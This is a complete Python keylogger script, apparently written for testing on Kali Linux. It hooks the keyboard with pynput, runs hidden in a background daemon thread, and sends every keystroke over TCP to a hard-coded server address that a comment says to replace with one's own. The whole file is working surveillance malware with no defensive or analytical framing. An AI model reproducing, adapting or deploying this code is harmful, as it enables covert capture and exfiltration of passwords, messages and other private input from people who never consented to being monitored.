#!/usr/bin/python3

# _*_ coding: utf-8 _*_
#tested on linux (Linux kali 6.5.0-kali2-amd64) and in LAN


try:
    import threading,socket
    from pynput import keyboard
except:
    pass

# <-- Intializing global values -->

#replace the ip with your server's ip 

#LAN (it establish a tcp connection for sending data)
SERVER_ADDRESS = '192.168.1.6:9090'.split(':')

        
#keystroke record
class keylogger:
    def Keylogging(self):

        def on_key_press(key):
            server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            server.connect((SERVER_ADDRESS[0],int(SERVER_ADDRESS[-1])))
            server.send(str(key).encode())
            server.close()

        # Create listener objects
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()


if __name__=='__main__':
    try:
        #creating an object
        obj=keylogger()

        #implementing threading and daemon = True (to run it in background)
        t1 = threading.Thread(target=obj.Keylogging,daemon=True)
        t1.start() 
        t1.join()    
    
    except KeyboardInterrupt:
        pass
